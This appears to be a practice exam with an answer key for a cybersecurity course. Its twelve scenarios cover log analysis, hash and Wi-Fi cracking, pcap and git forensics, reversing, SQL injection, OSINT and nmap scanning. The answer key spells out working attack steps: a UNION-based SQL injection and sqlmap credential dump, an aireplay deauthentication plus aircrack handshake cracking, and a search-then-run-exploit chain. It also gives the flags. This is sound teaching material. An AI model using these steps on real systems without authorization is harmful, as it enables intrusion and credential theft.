# Practice Exam Scenarios

> Modeled on the actual class labs (pcaps, logs, hashes, caps, git repos, crackmes).
> Try each scenario before looking at the answer key at the bottom. Each one maps to a command pattern you've already run this semester.

---

## Scenario 1 — The brute-forced SSH box (Log Analysis)

You're given `AUTH.log` from a compromised server (`myraptor`).

**Questions:**
1. How many failed SSH password attempts are in the log?
2. Which account was targeted, and from which source IP?
3. Did the attacker eventually get in? If so, from what IP?
4. Write the one-liner that finds the top attacking IPs in any auth log.

## Scenario 2 — The salted hashes (Cryptography & Cracking)

You're handed a file of Linux password records. First three lines:
```
$1$kSapWzGk$ZOwMpaQwk7AYAw/1zjoFg0
$1$JyEQpqRK$HLXmSB.dqfG6Og.yA2rc81
$6$To0oFk1u$QTxJC3bwqd3ruU8Dp9hqo7zHv/...long...
```

**Questions:**
1. What algorithm produced each? How can you tell?
2. Which three parts make up each record, separated by `$`?
3. What's the exact hashcat command to crack the `$6$` records with rockyou?
4. Why will a *plain* SHA-512 of the salt+password NOT match the stored hash?

## Scenario 3 — The two wireless captures (Wireless)

You're given `PCAP2.cap` (from a WEP network) and `PCAP3.cap` (captured near a WPA2-PSK network).

**Questions:**
1. Which capture can be cracked with IV collection alone (no wordlist), and which needs a wordlist?
2. Give the aircrack-ng command for each.
3. What would you have needed to do BEFORE these captures were taken (hint: airmon-ng / airodump-ng / aireplay-ng)?
4. What specifically must a WPA capture contain to be crackable?

## Scenario 4 — The mystery pcap (Traffic Analysis)

You're given `evidence01.pcap` (240 packets: some SSH, some TLS, some HTTP, DNS, ARP, NBNS).

**Questions:**
1. What's the first thing to check to see "what's inside" a pcap (Wireshark menu path)?
2. How do you list every HTTP request and find any submitted credentials?
3. Which filter shows every packet containing a specific IP?
4. How do you view an entire conversation (request + response) in one window?

## Scenario 5 — The suspicious image (File Carving / Stego basics)

You're given `green_file` — it claims to be a 63×36 PNG, but something feels off.

**Questions:**
1. One command identifies what the file REALLY is. What is it?
2. One command reveals (and extracts) files hidden inside it. What is it, and what flag does it produce?
3. What two other commands let you see readable strings / hex inside any binary?

## Scenario 6 — The sloppy developer (Git forensics)

You're given a git repo backup. The developer wrote: "This repo is for storing important information." You check `git log` and see:
```
f28a0c2 Oops wasn't supposed to commit that
438fa54 Backing up data
20771a8 Backup passwords
8557f6a Initial commit
```
but `FLAG.txt` exists nowhere in the current checkout.

**Questions:**
1. Where do deleted commits live so you can still find them?
2. Two ways to view the contents of the file the developer deleted. What flag was in it?
3. What file (with a plaintext password) IS still visible in the current branch, and what does it say?
4. What's the security lesson for git?

## Scenario 7 — The noisy web server (Web Log Analysis)

You're given `access.log` from nginx — 99 lines, mostly 404s and odd requests from unfamiliar IPs (`testproxy.php`, `xmlrpc.php`, etc.).

**Questions:**
1. Which awk one-liner produces a status-code histogram?
2. How do you find the top 5 requesting IPs?
3. What does a wall of 404s from one IP indicate?
4. Which field of the combined log format holds the User-Agent, and how could you spot a scanner by it?

## Scenario 8 — The proxy knows (Squid Log Analysis)

You're given `squid_access.log` — internal users' web browsing through a proxy:
```
1286536308.779  180 192.168.0.224 TCP_MISS/200 411 GET http://liveupdate.symantecliveupdate.com/... - DIRECT/... text/plain
```

**Questions:**
1. Which field is the internal client IP? Which is the URL?
2. One command to list every site user `192.168.0.224` visited.
3. What does TCP_MISS mean?
4. Why is a proxy log valuable to a blue team investigating an incident?

## Scenario 9 — The password checkers (Reverse Engineering)

Two challenges from NCL practice:

**A)** You get a Python script whose `verify()` compares your input (as hex pairs) against this list:
```python
ekc = [ 0x53, 75, 0x59, 0x2D, 0110, 0x45, 88, 72, 0x2D, 0x35, 0x36, 0x38, 0x30 ]
```
**B)** You get an ELF binary `crackme0x00` (64-bit, not stripped, debug info present).

**Questions:**
1. In (A), what's tricky about the list, and what password does it spell?
2. In (A), what format must the submission be in (decimal? hex? raw ASCII)?
3. In (B), what's the fastest CLI way to pull readable strings out of the binary?
4. What does "not stripped + debug info" mean for your reversing effort?

## Scenario 10 — The vulnerable product page (SQL Injection)

`http://target.com/product.php?id=1` renders a product.

**Questions:**
1. Give the full manual UNION workflow: confirm injection → column count → echoing columns → version/database → table list → dump creds.
2. What trick with the `id` value makes YOUR row display instead of the product's?
3. Give the equivalent sqlmap escalation chain.
4. The dumped password column holds `5f4dcc3b5aa765d61d8327deb882cf99`. What is it, and what do you do next?

## Scenario 11 — Know your target (OSINT)

You're assigned `example.com` with the instruction "passive recon only."

**Questions:**
1. Name three passive tools/commands and what each returns.
2. Which commonly-confused tool would BREAK the passive rule?
3. What dig command tests for a zone-transfer misconfiguration?
4. Give a Google dork that finds exposed PDFs and one that finds leaked config files.

## Scenario 12 — Scan to shell (Scanning + chaining tools)

You're told the exam target range is `10.10.10.0/24` only.

**Questions:**
1. Walk the chain: discover hosts → service/version scan → save XML → find exploits → pick one.
2. What does `filtered` mean for a port, and what likely causes it?
3. Why does a SYN scan never complete the 3-way handshake, and which DoS attack abuses the same handshake step?
4. How do you make sure you stay in scope?

---
---

# Answer Key

## 1 — Brute-forced SSH
1. **101** failed password attempts (`grep -c "Failed password" AUTH.log`).
2. User **harvey**, from **169.139.243.218**.
3. **Yes** — later: `Accepted password for harvey from 30.167.206.91` — a *different* IP. Pattern: mass failures then a success = compromise; note the IP change.
4. `grep "Failed password" AUTH.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn`
   (field tweak: `awk '{print $NF}'` gives `ssh2`; the IP is the 4th-from-last field — always check one line's field layout first with `awk '{print}'` or count fields).

## 2 — Salted hashes
1. `$1$` = **md5crypt** (old Linux), `$6$` = **sha512crypt** (modern Linux). Told by the numeric prefix; lengths/prefixes table: [08-hash-cheat-table.md](08-hash-cheat-table.md).
2. `$<id>$<salt>$<hash>`.
3. `gunzip rockyou first`, then: `hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt`
   (or `john --wordlist=rockyou.txt hashes.txt` — john auto-detects).
4. Because Linux password processing is *based on* SHA-512 but does more (salt prefix + extra rounds/processing per `crypt(3)`) — the stored value ≠ plain `echo -n salt+pass | sha512sum`. (Your `view-sample-password.sh` lab demonstrated exactly this.)

## 3 — Wireless
1. WEP cracks from captured **IVs alone**; WPA2-PSK needs a **handshake + wordlist**.
2. WEP: `aircrack-ng PCAP2.cap` · WPA: `aircrack-ng -w /usr/share/wordlists/rockyou.txt PCAP3.cap`
3. `airmon-ng check kill && airmon-ng start wlan0` → `airodump-ng` to find the target (locked with `--bssid` and matching `-c` channel) → `aireplay-ng --deauth` to force a reconnect.
4. The **4-way EAPOL handshake** (at minimum messages 1–2 or 2–3).

## 4 — Mystery pcap
1. **Statistics → Protocol Hierarchy** — instantly shows HTTP, TLS, SSH, DNS, NBNS, etc. and counts.
2. Filter `http.request.method == "POST"` (credentials) or just `http.request` — read form data in the packet detail pane, or Follow TCP Stream.
3. `ip.addr == x.x.x.x`.
4. Right-click a packet → **Follow → TCP Stream**.

## 5 — Suspicious image
1. `file green_file` → it's a real PNG (63×36) — but that's just the wrapper.
2. `binwalk green_file` → shows embedded files; `binwalk -e green_file` extracts them → inside: PNGs, a CAB, and `flags/flags.txt` → flag **`SKY-RWCI-4291`**.
3. `strings green_file` (readable text) and `xxd green_file | head` (hex view).

## 6 — Git forensics
1. The **reflog** (`git reflog`) and dangling objects (`git fsck --lost-found`); deleted commits stay in `.git` until garbage collection.
2. `git show 438fa54:FLAG.txt` (view a file at an old commit) or `git checkout f28a0c2^` / `git log -p --all -- FLAG.txt` to see it was deleted in commit f28a0c2. Flag: **`SKY-LRHX-4910`**.
3. `passwords.txt` on the current branch — `Facebook: waffles85`.
4. **Deleting a file never deletes history** — "removed" secrets stay in the repo; rotate any credential that ever touched git.

## 7 — Noisy web server
1. `awk '{print $9}' access.log | sort | uniq -c | sort -rn`
2. `awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -5`
3. **Directory brute-forcing** (dirbust): automated path guessing; a couple of 200s among the 404s are the real finds.
4. The User-Agent is in the quoted request's trailing quoted field (after the referer); scanners announce themselves with tools' names (`python-requests`, `masscan`, `ZGrab`).

## 8 — Proxy log
1. Field 3 = client IP, field 7 = URL. Squid's format: `time elapsed client TCPcode/status size METHOD URL rfc931 peer/status type`.
2. `awk '$3 == "192.168.0.224" {print $7}' squid_access.log` (or grep).
3. The object was NOT in the proxy cache — it was fetched from the origin (TCP_HIT would mean cached).
4. It records every site every internal user visited, with timestamps — the blue team's timeline of who went where (and which internal IP was patient zero for a malware download).

## 9 — Reverse engineering
1. The list mixes **hex (`0x53`), decimal (75, 88, 72), and octal (`0110`)** notations — Python parses all three. Converting each to a character: 0x53=`S`, 75=`K`, 0x59=`Y`, 0x2D=`-`, 0110(octal)=72=`H`, 0x45=`E`, 88=`X`, 72=`R`, 0x2D=`-`, 0x35=`5`, 0x36=`6`, 0x38=`8`, 0x30=`0` → password **`SKY-HEXR-5680`**.
2. **Hex pairs** — `verify()` reads input 2 chars at a time and does `int(pair, 16)`, then compares byte-for-byte. So the accepted input is the hex-encoding of that string: `534b592d...` — the script even prints `''.join('%02x' % i ...)` as a hint.
3. `strings crackme0x00` — then run it and observe the prompt; with debug info present, a disassembler (Binary Ninja / Ghidra / objdump -d) shows the comparison directly.
4. Symbols and source-line info are intact — function names and structure make the comparison logic easy to locate; nothing was obfuscated.

## 10 — SQL injection
1. `id=1'` (error = vulnerable) → `' ORDER BY 4-- -` until error (column count = 3) → `id=-1 UNION SELECT 1,2,3-- -` (see which columns echo) → `id=-1 UNION SELECT 1,version(),database()-- -` → `id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='webshop'-- -` → `id=-1 UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -`
2. `id=-1` (negative/invalid ID) — the original query returns nothing, so your UNION row is the one displayed.
3. `sqlmap -u URL --batch --dbs` → `-D webshop --tables` → `-D webshop -T users --dump` (auto-cracks hashes with rockyou).
4. 32 hex chars = **MD5** → `john --format=raw-md5 --wordlist=rockyou.txt` (it's `password`).

## 11 — OSINT
1. `whois` (registrar/contacts/nameservers) · `dig` (DNS records) · `theHarvester -d example.com -b google` (emails/hosts) — also `sherlock`, `sublist3r`, Shodan, `exiftool`.
2. **nikto** (and nmap) — they touch the target; passive-only means no packets to the target.
3. `dig axfr @ns1.example.com example.com` — zone transfer, a misconfiguration when allowed.
4. `site:example.com filetype:pdf` · `filetype:env DB_PASSWORD` (or `site:example.com inurl:admin`).

## 12 — Scan to shell
1. `nmap -sn 10.10.10.0/24` → `nmap -sV -sC -T4 -oX scan.xml 10.10.10.5` → `searchsploit --nmap scan.xml` (or `searchsploit <service> <version>`) → `searchsploit -m <EDB-ID>`, read it, run it (or the matching Metasploit module).
2. **Filtered** = no response / ICMP unreachable — a firewall or ACL in the way (vs closed = RST).
3. SYN scan stops after SYN-ACK and sends RST — never the final ACK. The **SYN flood** DoS sends SYNs and never ACKs either, leaving half-open connections until the server's ports are exhausted.
4. Only scan the **stated scope/range** — every command gets the exam's declared targets, not "interesting" neighbors.

---

**Scoring yourself:** 10+ scenarios comfortably = you're ready. Anything shaky → the matching numbered note/tutorial in this repo.
